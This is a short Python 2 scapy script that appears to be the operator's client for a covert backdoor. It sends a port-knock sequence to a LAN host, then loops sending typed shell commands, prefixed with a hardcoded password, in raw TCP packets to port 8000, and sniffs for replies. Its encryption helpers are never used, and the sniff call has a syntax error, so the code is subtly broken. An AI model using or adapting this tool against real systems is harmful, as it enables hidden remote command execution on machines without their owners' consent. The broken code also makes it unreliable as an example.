#!/usr/bin/python


import time, triplesec, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

knocks = [1000,2000,3000]
password = 'dumb'

def encrypt(data):
    ciphertext = triplesec.encrypt(data, 'top-secret-pw')
    return ciphertext

def decrypt(data):
    plaintext = triplesec.decrypt(data, 'top-secret-pw')
    return plaintext

def portKnock():
    for knock in knocks:
        packet = IP(dst="192.168.0.19")/UDP(sport=knock, dport=7000)
        send(packet)
        time.sleep(1)

def sendCommand(protocol, data, password):
    if protocol == "tcp":
        packet = IP(dst="192.168.0.19")/TCP(dport=8000, sport=7999)/Raw(load=password+data)
    if protocol == "udp":
        packet = IP(dst="192.168.0.19")/UDP(dport=8000, sport=7999)/Raw(load=password+data)
    send(packet)

def recvCommand(packet):
   if packet.haslayer(IP) and packet.haslayer(Raw):
        data = packet['Raw'].load
        if data.startswith(password):
            data = data[len(password):]
            print data

def main():
    portKnock()

    while 1:
        command = raw_input("Enter command: ")
        sendCommand('tcp', command, 'dumb')
        sniff(filter='dst port 8000 and src port 8000', count=1 prn=recvCommand)

if __name__ == '__main__':
    main()
